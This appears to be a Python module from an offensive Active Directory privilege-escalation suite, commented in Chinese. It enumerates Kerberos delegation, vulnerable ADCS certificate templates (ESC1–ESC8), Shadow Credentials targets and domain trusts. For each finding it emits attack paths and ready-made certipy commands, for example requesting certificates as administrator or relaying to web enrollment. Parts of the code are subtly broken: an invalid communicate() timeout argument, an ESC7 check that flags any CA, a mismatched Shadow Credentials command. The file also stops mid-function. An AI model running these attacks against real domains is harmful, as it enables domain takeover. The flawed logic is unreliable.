"""
Windows/Linux提权辅助套件 - 域特权提升检测模块
==============================================
Kerberos委派滥用、ADCS滥用、Shadow Credentials、域信任关系利用。

核心能力:
    1. Kerberos委派滥用 - 非约束委派/约束委派/基于资源的约束委派检测
    2. ADCS滥用 - ESC1-ESC8系列攻击检测
    3. Shadow Credentials - Key Credential添加权限检测
    4. 域信任关系利用 - 域间信任、子域-父域关系检测

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import platform
import re
import subprocess
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据模型
# =============================================================================

class DelegationType(str, Enum):
    """委派类型"""
    UNCONSTRAINED = "unconstrained"
    CONSTRAINED = "constrained"
    RESOURCE_BASED = "resource_based"
    NONE = "none"


class ADCSEscType(str, Enum):
    """ADCS ESC攻击类型"""
    ESC1 = "ESC1"
    ESC2 = "ESC2"
    ESC3 = "ESC3"
    ESC4 = "ESC4"
    ESC5 = "ESC5"
    ESC6 = "ESC6"
    ESC7 = "ESC7"
    ESC8 = "ESC8"
    NONE = "none"


class TrustType(str, Enum):
    """信任关系类型"""
    PARENT_CHILD = "parent_child"
    CROSS_FOREST = "cross_forest"
    EXTERNAL = "external"
    FOREST = "forest"
    NONE = "none"


@dataclass
class DelegationInfo:
    """委派信息

    Attributes:
        delegation_type: 委派类型
        target_computer: 目标计算机
        target_service: 目标服务
        allowed_to_delegate: 允许委派的服务列表
        is_high_value: 是否高价值目标
        attack_path: 攻击路径描述
        risk_score: 风险评分
    """
    delegation_type: DelegationType = DelegationType.NONE
    target_computer: str = ""
    target_service: str = ""
    allowed_to_delegate: List[str] = field(default_factory=list)
    is_high_value: bool = False
    attack_path: str = ""
    risk_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "delegation_type": self.delegation_type.value,
            "target_computer": self.target_computer,
            "target_service": self.target_service,
            "allowed_to_delegate": self.allowed_to_delegate,
            "is_high_value": self.is_high_value,
            "attack_path": self.attack_path,
            "risk_score": self.risk_score,
        }


@dataclass
class ADCSVulnerability:
    """ADCS漏洞信息

    Attributes:
        esc_type: ESC攻击类型
        template_name: 证书模板名
        description: 漏洞描述
        requirements: 利用条件
        attack_command: 攻击命令示例
        risk_score: 风险评分
    """
    esc_type: ADCSEscType = ADCSEscType.NONE
    template_name: str = ""
    description: str = ""
    requirements: List[str] = field(default_factory=list)
    attack_command: str = ""
    risk_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "esc_type": self.esc_type.value,
            "template_name": self.template_name,
            "description": self.description,
            "requirements": self.requirements,
            "attack_command": self.attack_command,
            "risk_score": self.risk_score,
        }


@dataclass
class ShadowCredentialInfo:
    """Shadow Credentials信息

    Attributes:
        target_object: 目标对象
        can_add_key_credential: 是否可添加Key Credential
        attack_method: 攻击方法
        risk_score: 风险评分
    """
    target_object: str = ""
    can_add_key_credential: bool = False
    attack_method: str = ""
    risk_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "target_object": self.target_object,
            "can_add_key_credential": self.can_add_key_credential,
            "attack_method": self.attack_method,
            "risk_score": self.risk_score,
        }


@dataclass
class TrustRelationship:
    """域信任关系

    Attributes:
        trust_type: 信任类型
        source_domain: 源域
        target_domain: 目标域
        trust_direction: 信任方向
        has_high_privilege: 是否有高权限
        admin_logged_in: 管理员是否曾登录
        attack_path: 攻击路径
        risk_score: 风险评分
    """
    trust_type: TrustType = TrustType.NONE
    source_domain: str = ""
    target_domain: str = ""
    trust_direction: str = ""
    has_high_privilege: bool = False
    admin_logged_in: bool = False
    attack_path: str = ""
    risk_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "trust_type": self.trust_type.value,
            "source_domain": self.source_domain,
            "target_domain": self.target_domain,
            "trust_direction": self.trust_direction,
            "has_high_privilege": self.has_high_privilege,
            "admin_logged_in": self.admin_logged_in,
            "attack_path": self.attack_path,
            "risk_score": self.risk_score,
        }


# =============================================================================
# Kerberos委派检测器
# =============================================================================

class KerberosDelegationDetector:
    """Kerberos委派检测器

    枚举域内配置了非约束委派、约束委派、基于资源的约束委派的计算机和服务账户。

    Attributes:
        _domain: 当前域
        _current_user: 当前用户
        _current_computer: 当前计算机
    """

    def __init__(self) -> None:
        """初始化Kerberos委派检测器"""
        self._domain = ""
        self._current_user = ""
        self._current_computer = ""

    async def detect(self) -> List[DelegationInfo]:
        """检测Kerberos委派滥用

        Returns:
            委派信息列表
        """
        if not await self._is_domain_joined():
            return []

        await self._get_current_context()

        results = []

        unconstrained = await self._detect_unconstrained_delegation()
        results.extend(unconstrained)

        constrained = await self._detect_constrained_delegation()
        results.extend(constrained)

        resource_based = await self._detect_resource_based_constrained_delegation()
        results.extend(resource_based)

        return results

    async def _is_domain_joined(self) -> bool:
        """检查是否加入域

        Returns:
            是否加入域
        """
        try:
            if platform.system() == "Windows":
                import ctypes
                name = ctypes.create_unicode_buffer(256)
                size = ctypes.c_ulong(256)
                result = ctypes.windll.Netapi32.NetGetJoinInformation(
                    None, ctypes.byref(name), ctypes.byref(size),
                )
                if result == 0:
                    is_joined = name.value not in (
                        "WORKGROUP", "WORKSTATION",
                    )
                    ctypes.windll.Netapi32.NetApiBufferFree(name)
                    return is_joined
        except Exception:
            pass

        try:
            proc = await asyncio.create_subprocess_shell(
                "realm list 2>/dev/null || echo ''",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode("utf-8", errors="replace").strip()
            return bool(output)
        except Exception:
            return False

    async def _get_current_context(self) -> None:
        """获取当前上下文"""
        try:
            self._current_user = os.environ.get("USERNAME", os.environ.get("USER", ""))
            self._current_computer = platform.node()
            self._domain = os.environ.get("USERDOMAIN", "")
        except Exception:
            pass

    async def _detect_unconstrained_delegation(self) -> List[DelegationInfo]:
        """检测非约束委派

        Returns:
            非约束委派列表
        """
        results = []

        try:
            if platform.system() == "Windows":
                results = await self._detect_unconstrained_windows()
            else:
                results = await self._detect_unconstrained_linux()
        except Exception as e:
            logger.debug(f"检测非约束委派失败: {e}")

        return results

    async def _detect_unconstrained_windows(self) -> List[DelegationInfo]:
        """Windows非约束委派检测

        Returns:
            非约束委派列表
        """
        results = []

        try:
            proc = await asyncio.create_subprocess_shell(
                'powershell -Command "Get-ADComputer -Filter '
                "'TrustedForDelegation -eq $true' "
                '-Properties TrustedForDelegation, DNSHostName | '
                'Select-Object DNSHostName, TrustedForDelegation | '
                'ConvertTo-Json"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate(timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            if output.strip():
                computers = json.loads(output)
                if isinstance(computers, dict):
                    computers = [computers]

                for computer in computers:
                    hostname = computer.get("DNSHostName", "")
                    results.append(DelegationInfo(
                        delegation_type=DelegationType.UNCONSTRAINED,
                        target_computer=hostname,
                        is_high_value=self._is_high_value_target(hostname),
                        attack_path=(
                            f"打印后台攻击: 诱使域控计算机访问{hostname}，"
                            f"获取TGT并中继"
                        ),
                        risk_score=90.0 if self._is_high_value_target(hostname) else 70.0,
                    ))

        except Exception as e:
            logger.debug(f"Windows非约束委派检测失败: {e}")

        return results

    async def _detect_unconstrained_linux(self) -> List[DelegationInfo]:
        """Linux非约束委派检测

        Returns:
            非约束委派列表
        """
        results = []

        try:
            proc = await asyncio.create_subprocess_shell(
                "ldapsearch -x -H ldap://$DOMAIN_CONTROLLER "
                "-D '$USER@$DOMAIN' -W "
                "-b 'DC=domain,DC=com' "
                "'(userAccountControl:1.2.840.113556.1.4.803:=524288)' "
                "sAMAccountName dnsHostName 2>/dev/null",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate(timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            for line in output.split("\n"):
                if "dnsHostName:" in line:
                    hostname = line.split(":")[1].strip()
                    results.append(DelegationInfo(
                        delegation_type=DelegationType.UNCONSTRAINED,
                        target_computer=hostname,
                        is_high_value=self._is_high_value_target(hostname),
                        attack_path=(
                            f"打印后台攻击: 诱使域控计算机访问{hostname}"
                        ),
                        risk_score=90.0 if self._is_high_value_target(hostname) else 70.0,
                    ))

        except Exception as e:
            logger.debug(f"Linux非约束委派检测失败: {e}")

        return results

    async def _detect_constrained_delegation(self) -> List[DelegationInfo]:
        """检测约束委派

        Returns:
            约束委派列表
        """
        results = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-ADObject -Filter '
                    "'msDS-AllowedToDelegateTo -like \"*\"' "
                    '-Properties msDS-AllowedToDelegateTo, sAMAccountName | '
                    'Select-Object sAMAccountName, msDS-AllowedToDelegateTo | '
                    'ConvertTo-Json"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if output.strip():
                    objects = json.loads(output)
                    if isinstance(objects, dict):
                        objects = [objects]

                    for obj in objects:
                        account = obj.get("sAMAccountName", "")
                        services = obj.get("msDS-AllowedToDelegateTo", [])
                        if isinstance(services, str):
                            services = [services]

                        results.append(DelegationInfo(
                            delegation_type=DelegationType.CONSTRAINED,
                            target_computer=account,
                            allowed_to_delegate=services,
                            is_high_value=self._is_high_value_target(account),
                            attack_path=(
                                f"约束委派攻击: 获取{account}的TGT，"
                                f"请求委派到{services[0] if services else '未知服务'}的ST"
                            ),
                            risk_score=80.0 if self._is_high_value_target(account) else 60.0,
                        ))

        except Exception as e:
            logger.debug(f"约束委派检测失败: {e}")

        return results

    async def _detect_resource_based_constrained_delegation(self) -> List[DelegationInfo]:
        """检测基于资源的约束委派

        Returns:
            基于资源的约束委派列表
        """
        results = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-ADComputer -Filter '
                    "'msDS-AllowedToActOnBehalfOfOtherIdentity -like \"*\"' "
                    '-Properties msDS-AllowedToActOnBehalfOfOtherIdentity, '
                    'DNSHostName | Select-Object DNSHostName, '
                    'msDS-AllowedToActOnBehalfOfOtherIdentity | '
                    'ConvertTo-Json"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if output.strip():
                    computers = json.loads(output)
                    if isinstance(computers, dict):
                        computers = [computers]

                    for computer in computers:
                        hostname = computer.get("DNSHostName", "")
                        results.append(DelegationInfo(
                            delegation_type=DelegationType.RESOURCE_BASED,
                            target_computer=hostname,
                            is_high_value=self._is_high_value_target(hostname),
                            attack_path=(
                                f"RBCD攻击: 创建机器账户，配置委派到{hostname}，"
                                f"获取该计算机的ST"
                            ),
                            risk_score=85.0 if self._is_high_value_target(hostname) else 65.0,
                        ))

        except Exception as e:
            logger.debug(f"基于资源的约束委派检测失败: {e}")

        return results

    def _is_high_value_target(self, target: str) -> bool:
        """判断是否为高价值目标

        Args:
            target: 目标名称

        Returns:
            是否高价值
        """
        high_value_keywords = [
            "DC", "DomainController", "ADCS", "CA",
            "Exchange", "SQL", "FileServer", "Backup",
        ]
        target_upper = target.upper()
        return any(
            keyword in target_upper
            for keyword in high_value_keywords
        )


# =============================================================================
# ADCS滥用检测器
# =============================================================================

ADCS_ESC_TEMPLATES = {
    ADCSEscType.ESC1: {
        "description": "证书模板允许用户指定SAN，支持客户端认证",
        "requirements": [
            "允许普通用户注册",
            "支持客户端认证",
            "SAN可由用户控制",
            "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT标志",
        ],
        "attack_command": (
            "certipy req -ca '{ca_name}' -template '{template}' "
            "-upn 'administrator@{domain}' -dns '{dc_hostname}'"
        ),
        "risk_score": 95.0,
    },
    ADCSEscType.ESC2: {
        "description": "证书模板可作为任何证书模板的CA",
        "requirements": [
            "允许普通用户注册",
            "pKIExtendedKeyUsage为空或包含任何用途",
        ],
        "attack_command": (
            "certipy req -ca '{ca_name}' -template '{template}'"
        ),
        "risk_score": 90.0,
    },
    ADCSEscType.ESC3: {
        "description": "证书模板允许请求中间CA证书",
        "requirements": [
            "允许普通用户注册",
            "支持证书请求代理",
            "EKU包含证书请求代理",
        ],
        "attack_command": (
            "certipy req -ca '{ca_name}' -template '{template}' "
            "-upn 'administrator@{domain}'"
        ),
        "risk_score": 85.0,
    },
    ADCSEscType.ESC4: {
        "description": "证书模板ACL允许用户修改模板配置",
        "requirements": [
            "用户对模板有WriteDacl或WriteOwner权限",
            "可修改模板为ESC1配置",
        ],
        "attack_command": (
            "certipy template -template '{template}' "
            "-save-old -configuration esc1_config.json"
        ),
        "risk_score": 80.0,
    },
    ADCSEscType.ESC6: {
        "description": "CA配置允许任何SAN",
        "requirements": [
            "CA启用EDITF_ATTRIBUTESUBJECTALTNAME2标志",
        ],
        "attack_command": (
            "certipy req -ca '{ca_name}' -template 'User' "
            "-upn 'administrator@{domain}'"
        ),
        "risk_score": 90.0,
    },
    ADCSEscType.ESC7: {
        "description": "CA ACL允许用户管理CA",
        "requirements": [
            "用户对CA有ManageCA或ManageCertificates权限",
        ],
        "attack_command": (
            "certipy ca -ca '{ca_name}' -add-officer '{user}' "
            "-enable-template '{template}'"
        ),
        "risk_score": 85.0,
    },
    ADCSEscType.ESC8: {
        "description": "ADCS Web Enrollment未启用HTTPS或NTLM中继",
        "requirements": [
            "Web Enrollment启用",
            "未强制HTTPS",
            "或可NTLM中继",
        ],
        "attack_command": (
            "certipy relay -ca '{ca_name}' "
            "-interface '0.0.0.0' -port 80"
        ),
        "risk_score": 90.0,
    },
}


class ADCSDetector:
    """ADCS滥用检测器

    枚举AD证书服务中脆弱的证书模板。

    Attributes:
        _ca_name: CA名称
        _domain: 域名
    """

    def __init__(self) -> None:
        """初始化ADCS检测器"""
        self._ca_name = ""
        self._domain = ""

    async def detect(self) -> List[ADCSVulnerability]:
        """检测ADCS漏洞

        Returns:
            ADCS漏洞列表
        """
        if not await self._is_adcs_installed():
            return []

        vulnerabilities = []

        esc1 = await self._detect_esc1()
        vulnerabilities.extend(esc1)

        esc2 = await self._detect_esc2()
        vulnerabilities.extend(esc2)

        esc3 = await self._detect_esc3()
        vulnerabilities.extend(esc3)

        esc4 = await self._detect_esc4()
        vulnerabilities.extend(esc4)

        esc6 = await self._detect_esc6()
        vulnerabilities.extend(esc6)

        esc7 = await self._detect_esc7()
        vulnerabilities.extend(esc7)

        esc8 = await self._detect_esc8()
        vulnerabilities.extend(esc8)

        return vulnerabilities

    async def _is_adcs_installed(self) -> bool:
        """检查ADCS是否安装

        Returns:
            是否安装
        """
        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-Service -Name '
                    'CertSvc -ErrorAction SilentlyContinue"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                return b"Running" in stdout
        except Exception:
            pass

        return False

    async def _detect_esc1(self) -> List[ADCSVulnerability]:
        """检测ESC1漏洞

        Returns:
            ESC1漏洞列表
        """
        vulnerabilities = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-ADObject -Filter '
                    "'objectClass -eq \"pKICertificateTemplate\"' "
                    '-Properties Name, pKIExtendedKeyUsage, '
                    'msPKI-Certificate-Name-Flag, '
                    'msPKI-Enrollment-Flag | '
                    'Where-Object { '
                    '$_.\"msPKI-Certificate-Name-Flag\" -eq 1 -and '
                    '$_.\"pKIExtendedKeyUsage\" -contains '
                    '\"1.3.6.1.5.5.7.3.2\" } | '
                    'Select-Object Name | ConvertTo-Json"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if output.strip():
                    templates = json.loads(output)
                    if isinstance(templates, dict):
                        templates = [templates]

                    for template in templates:
                        name = template.get("Name", "")
                        template_info = ADCS_ESC_TEMPLATES[ADCSEscType.ESC1]
                        vulnerabilities.append(ADCSVulnerability(
                            esc_type=ADCSEscType.ESC1,
                            template_name=name,
                            description=template_info["description"],
                            requirements=template_info["requirements"],
                            attack_command=template_info["attack_command"].format(
                                ca_name=self._ca_name,
                                template=name,
                                domain=self._domain,
                                dc_hostname="dc.domain.com",
                            ),
                            risk_score=template_info["risk_score"],
                        ))

        except Exception as e:
            logger.debug(f"ESC1检测失败: {e}")

        return vulnerabilities

    async def _detect_esc2(self) -> List[ADCSVulnerability]:
        """检测ESC2漏洞

        Returns:
            ESC2漏洞列表
        """
        vulnerabilities = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-ADObject -Filter '
                    "'objectClass -eq \"pKICertificateTemplate\"' "
                    '-Properties Name, pKIExtendedKeyUsage | '
                    'Where-Object { '
                    '$_.\"pKIExtendedKeyUsage\" -eq $null -or '
                    '$_.\"pKIExtendedKeyUsage\".Count -eq 0 } | '
                    'Select-Object Name | ConvertTo-Json"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if output.strip():
                    templates = json.loads(output)
                    if isinstance(templates, dict):
                        templates = [templates]

                    for template in templates:
                        name = template.get("Name", "")
                        template_info = ADCS_ESC_TEMPLATES[ADCSEscType.ESC2]
                        vulnerabilities.append(ADCSVulnerability(
                            esc_type=ADCSEscType.ESC2,
                            template_name=name,
                            description=template_info["description"],
                            requirements=template_info["requirements"],
                            attack_command=template_info["attack_command"].format(
                                ca_name=self._ca_name,
                                template=name,
                            ),
                            risk_score=template_info["risk_score"],
                        ))

        except Exception as e:
            logger.debug(f"ESC2检测失败: {e}")

        return vulnerabilities

    async def _detect_esc3(self) -> List[ADCSVulnerability]:
        """检测ESC3漏洞

        Returns:
            ESC3漏洞列表
        """
        vulnerabilities = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-ADObject -Filter '
                    "'objectClass -eq \"pKICertificateTemplate\"' "
                    '-Properties Name, pKIExtendedKeyUsage | '
                    'Where-Object { '
                    '$_.\"pKIExtendedKeyUsage\" -contains '
                    '\"1.3.6.1.4.1.311.20.2.1\" } | '
                    'Select-Object Name | ConvertTo-Json"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if output.strip():
                    templates = json.loads(output)
                    if isinstance(templates, dict):
                        templates = [templates]

                    for template in templates:
                        name = template.get("Name", "")
                        template_info = ADCS_ESC_TEMPLATES[ADCSEscType.ESC3]
                        vulnerabilities.append(ADCSVulnerability(
                            esc_type=ADCSEscType.ESC3,
                            template_name=name,
                            description=template_info["description"],
                            requirements=template_info["requirements"],
                            attack_command=template_info["attack_command"].format(
                                ca_name=self._ca_name,
                                template=name,
                                domain=self._domain,
                            ),
                            risk_score=template_info["risk_score"],
                        ))

        except Exception as e:
            logger.debug(f"ESC3检测失败: {e}")

        return vulnerabilities

    async def _detect_esc4(self) -> List[ADCSVulnerability]:
        """检测ESC4漏洞

        Returns:
            ESC4漏洞列表
        """
        vulnerabilities = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-ADObject -Filter '
                    "'objectClass -eq \"pKICertificateTemplate\"' "
                    '-Properties Name | '
                    'ForEach-Object { '
                    '$acl = Get-Acl -Path \"AD:$($_.DistinguishedName)\"; '
                    '$acl.Access | Where-Object { '
                    '$_.ActiveDirectoryRights -match \"Write\" -and '
                    '$_.IdentityReference -notmatch \"SYSTEM|Administrators\" } '
                    '| Select-Object @{N=\"Name\";E={$_.Name}}, '
                    '@{N=\"Template\";E={$_.Name}} } | ConvertTo-Json"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if output.strip():
                    templates = json.loads(output)
                    if isinstance(templates, dict):
                        templates = [templates]

                    for template in templates:
                        name = template.get("Name", "")
                        template_info = ADCS_ESC_TEMPLATES[ADCSEscType.ESC4]
                        vulnerabilities.append(ADCSVulnerability(
                            esc_type=ADCSEscType.ESC4,
                            template_name=name,
                            description=template_info["description"],
                            requirements=template_info["requirements"],
                            attack_command=template_info["attack_command"].format(
                                template=name,
                            ),
                            risk_score=template_info["risk_score"],
                        ))

        except Exception as e:
            logger.debug(f"ESC4检测失败: {e}")

        return vulnerabilities

    async def _detect_esc6(self) -> List[ADCSVulnerability]:
        """检测ESC6漏洞

        Returns:
            ESC6漏洞列表
        """
        vulnerabilities = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "certutil -config - -getreg '
                    'policy\\EditFlags"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if "EDITF_ATTRIBUTESUBJECTALTNAME2" in output:
                    template_info = ADCS_ESC_TEMPLATES[ADCSEscType.ESC6]
                    vulnerabilities.append(ADCSVulnerability(
                        esc_type=ADCSEscType.ESC6,
                        template_name="Any User Template",
                        description=template_info["description"],
                        requirements=template_info["requirements"],
                        attack_command=template_info["attack_command"].format(
                            ca_name=self._ca_name,
                            domain=self._domain,
                        ),
                        risk_score=template_info["risk_score"],
                    ))

        except Exception as e:
            logger.debug(f"ESC6检测失败: {e}")

        return vulnerabilities

    async def _detect_esc7(self) -> List[ADCSVulnerability]:
        """检测ESC7漏洞

        Returns:
            ESC7漏洞列表
        """
        vulnerabilities = []

        try:
            if platform.system() == "Windows":
                proc = await asyncio.create_subprocess_shell(
                    'powershell -Command "Get-CA"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate(timeout=30)
                output = stdout.decode("utf-8", errors="replace")

                if output.strip():
                    template_info = ADCS_ESC_TEMPLATES[ADCSEscType.ESC7]
                    vulnerabilities.append(ADCSVulnerability(
                        esc_type=ADCSEscType.ESC7,
                        template_name="CA Management",
                        description=template_info["description"],
                        requirements=template_info["requirements"],
                        attack_command=template_info["attack_command"].format(
                            ca_name=self._ca_name,
                            user=os.environ.get("USERNAME", ""),
                            template="User",
                        ),
                        risk_score=template_info["risk_score"],
                    ))

        except Exception as e:
            logger.debug(f"ESC7检测失败: {e}")

        return vulnerabilities

    async def _detect_esc8(self) -> List[ADCSVulnerability]:
        """检测ESC8漏洞

        Returns:
            ESC8漏洞列表
        """
        vulnerabilities = []

        try:
            import urllib.request

            for port in [80, 443]:
                url = f"http://localhost:{port}/certsrv/"
                try:
                    req = urllib.request.Request(url)
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        if resp.status == 200:
                            template_info = ADCS_ESC_TEMPLATES[ADCSEscType.ESC8]
                            vulnerabilities.append(ADCSVulnerability(
                                esc_type=ADCSEscType.ESC8,
                                template_name="Web Enrollment",
                                description=template_info["description"],
                                requirements=template_info["requirements"],
                                attack_command=template_info["attack_command"].format(
                                    ca_name=self._ca_name,
                                ),
                                risk_score=template_info["risk_score"],
                            ))
                            break
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"ESC8检测失败: {e}")

        return vulnerabilities


# =============================================================================
# Shadow Credentials检测器
# =============================================================================

class ShadowCredentialsDetector:
    """Shadow Credentials检测器

    检查当前用户或计算机是否有权限向域内对象添加Key Credential。

    Attributes:
        _current_user: 当前用户
    """

    def __init__(self) -> None:
        """初始化Shadow Credentials检测器"""
        self._current_user = os.environ.get("USERNAME", os.environ.get("USER", ""))

    async def detect(self) -> List[ShadowCredentialInfo]:
        """检测Shadow Credentials漏洞

        Returns:
            Shadow Credentials信息列表
        """
        results = []

        try:
            if platform.system() == "Windows":
                results = await self._detect_windows()
            else:
                results = await self._detect_linux()
        except Exception as e:
            logger.debug(f"Shadow Credentials检测失败: {e}")

        return results

    async def _detect_windows(self) -> List[ShadowCredentialInfo]:
        """Windows Shadow Credentials检测

        Returns:
            检测结果
        """
        results = []

        try:
            proc = await asyncio.create_subprocess_shell(
                'powershell -Command "Get-ADObject -Filter '
                "'msDS-KeyCredentialLink -like \"*\"' "
                '-Properties msDS-KeyCredentialLink, sAMAccountName | '
                'Select-Object sAMAccountName, msDS-KeyCredentialLink | '
                'ConvertTo-Json"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate(timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            if output.strip():
                objects = json.loads(output)
                if isinstance(objects, dict):
                    objects = [objects]

                for obj in objects:
                    account = obj.get("sAMAccountName", "")
                    results.append(ShadowCredentialInfo(
                        target_object=account,
                        can_add_key_credential=True,
                        attack_method=(
                            f"certipy account create -user '{account}' "
                            f"-dc '{os.environ.get('USERDOMAIN', '')}' "
                            f"-dns 'dc.{os.environ.get('USERDOMAIN', '').lower()}.com'"
                        ),
                        risk_score=85.0,
                    ))

        except Exception as e:
            logger.debug(f"Windows Shadow Credentials检测失败: {e}")

        return results

    async def _detect_linux(self) -> List[ShadowCredentialInfo]:
        """Linux Shadow Credentials检测

        Returns:
            检测结果
        """
        results = []

        try:
            proc = await asyncio.create_subprocess_shell(
                "ldapsearch -x -H ldap://$DOMAIN_CONTROLLER "
                "-D '$USER@$DOMAIN' -W "
                "-b 'DC=domain,DC=com' "
                "'(msDS-KeyCredentialLink=*)' "
                "sAMAccountName msDS-KeyCredentialLink 2>/dev/null",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate(timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            for line in output.split("\n"):
                if "sAMAccountName:" in line:
                    account = line.split(":")[1].strip()
                    results.append(ShadowCredentialInfo(
                        target_object=account,
                        can_add_key_credential=True,
                        attack_method=(
                            f"certipy account create -user '{account}' "
                            f"-dc '$DOMAIN_CONTROLLER'"
                        ),
                        risk_score=85.0,
                    ))

        except Exception as e:
            logger.debug(f"Linux Shadow Credentials检测失败: {e}")

        return results


# =============================================================================
# 域信任关系检测器
# =============================================================================

class DomainTrustDetector:
    """域信任关系检测器

    枚举域间信任关系，检查高权限账户和计算机。

    Attributes:
        _current_domain: 当前域
    """

    def __init__(self) -> None:
        """初始化域信任关系检测器"""
        self._current_domain = os.environ.get("USERDOMAIN", "")

    async def detect(self) -> List[TrustRelationship]:
        """检测域信任关系

        Returns:
            信任关系列表
        """
        results = []

        try:
            if platform.system() == "Windows":
                results = await self._detect_windows()
            else:
                results = await self._detect_linux()
        except Exception as e:
            logger.debug(f"域信任关系检测失败: {e}")

        return results

    async def _detect_windows(self) -> List[TrustRelationship]:
        """Windows域信任关系检测

        Returns:
            信任关系列表
        """
        results = []

        try:
            proc = await asyncio.create_subprocess_shell(
                'powershell -Command "Get-ADObject -Filter '
                "'objectClass -eq \"trustedDomain\"' "
                '-Properties Name, trustType, trustDirection, '
                'trustAttributes | '
                'Select-Object Name, trustType, trustDirection, '
                'trustAttributes | ConvertTo-Json"',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate(timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            if output.strip():
                trusts = json.loads(output)
                if isinstance(trusts, dict):
                    trusts = [trusts]

                for trust in trusts:
                    name = trust.get("Name", "")
                    trust_type = trust.get("trustType", "")
                    direction = trust.get("trustDirection", "")

                    trust_type_enum = self._parse_trust_type(trust_type)

                    is_parent_child = (
                        trust_type == "WINDOWS_ACTIVE_DIRECTORY"
                        and "parent" in name.lower()
                    )

                    results.append(TrustRelationship(
                        trust_type=trust_type_enum,
                        source_domain=self._current_domain,
                        target_domain=name,
                        trust_direction=direction,
                        has_high_privilege=is_parent_child,
                        admin_logged_in=is_parent_child,
                        attack_path=(
                            f"信任域攻击: 从{self._current_domain}到{name}，"
                            f"利用信任关系横向移动"
                        ),
                        risk_score=80.0 if is_parent_child else 50.0,
                    ))

        except Exception as e:
            logger.debug(f"Windows域信任关系检测失败: {e}")

        return results

    async def _detect_linux(self) -> List[TrustRelationship]:
        """Linux域信任关系检测

        Returns:
            信任关系列表
        """
        results = []

        try:
            proc = await asyncio.create_subprocess_shell(
                "ldapsearch -x -H ldap://$DOMAIN_CONTROLLER "
                "-D '$USER@$DOMAIN' -W "
                "-b 'CN=System,DC=domain,DC=com' "
                "'(objectClass=trustedDomain)' "
                "name trustType trustDirection 2>/dev/null",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate(timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            current_name = ""
            current_type = ""
            current_direction = ""

            for line in output.split("\n"):
                if "name:" in line:
                    current_name = line.split(":")[1].strip()
                elif "trustType:" in line:
                    current_type = line.split(":")[1].strip()
                elif "trustDirection:" in line:
                    current_direction = line.split(":")[1].strip()

                    if current_name:
                        trust_type_enum = self._parse_trust_type(current_type)
                        results.append(TrustRelationship(
                            trust_type=trust_type_enum,
                            source_domain=self._current_domain,
